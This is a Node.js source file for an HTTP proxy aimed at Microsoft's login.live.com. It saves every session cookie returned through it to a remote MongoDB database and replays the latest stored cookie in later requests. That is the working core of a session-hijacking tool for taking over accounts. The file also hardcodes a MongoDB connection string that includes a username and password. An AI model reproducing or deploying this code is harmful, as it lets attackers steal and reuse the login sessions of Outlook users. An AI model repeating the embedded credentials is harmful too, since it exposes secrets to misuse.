const http = require('http');
const https = require('https');
const url = require('url');
const { MongoClient, ServerApiVersion } = require('mongodb');

const PORT = 8080;
const OUTLOOK_URL = 'https://login.live.com';

// MongoDB setup
const mongoUri = "mongodb+srv://privatekevin22:quwJy1-keghin-fisvak@office.nrrawdd.mongodb.net/?retryWrites=true&w=majority&appName=office";
const client = new MongoClient(mongoUri, {
  serverApi: ServerApiVersion.v1 // Using MongoDB Stable API version
});

const dbName = 'test'; // Replace with your database name
const collectionName = 'users'; // Replace with your collection name
let cookiesCollection;

const proxyServer = http.createServer(async (clientReq, clientRes) => {
    try {
        console.log("Attempting to connect to MongoDB..."); // Added log
        if (!client.topology) {
            await client.connect();
            console.log("Successfully connected to MongoDB!"); // Log message confirming MongoDB connection
            cookiesCollection = client.db(dbName).collection(collectionName);
        } else {
            console.log("Already connected to MongoDB.");
        }

        const clientUrl = url.parse(clientReq.url);
        const options = {
            hostname: clientUrl.hostname,
            port: clientUrl.port || (clientUrl.protocol === 'https:' ? 443 : 80),
            path: clientUrl.path,
            method: clientReq.method,
            headers: {
                ...clientReq.headers
            }
        };

        // Fetch the latest cookies from MongoDB
        const latestCookies = await cookiesCollection.findOne({}, { sort: { _id: -1 } });
        if (latestCookies) {
            options.headers.cookie = latestCookies.value;
        }

        const proxyReq = (clientUrl.protocol === 'https:' ? https : http).request(options, (proxyRes) => {
            const newCookies = proxyRes.headers['set-cookie'];
            if (newCookies) {
                // Save the new cookies to MongoDB
                cookiesCollection.insertOne({ value: newCookies.join('; '), createdAt: new Date() });
            }

            clientRes.writeHead(proxyRes.statusCode, proxyRes.headers);
            proxyRes.pipe(clientRes, { end: true });
        });

        proxyReq.on('error', (err) => {
            console.error('Proxy request error:', err);
            clientRes.statusCode = 500;
            clientRes.end('Proxy request error');
        });

        clientReq.pipe(proxyReq, { end: true });

    } catch (err) {
        console.error('MongoDB connection error:', err); // More specific error log
        clientRes.statusCode = 500;
        clientRes.end('Internal Server Error');
    }
});

proxyServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Proxy server running on port ${PORT}`);
});

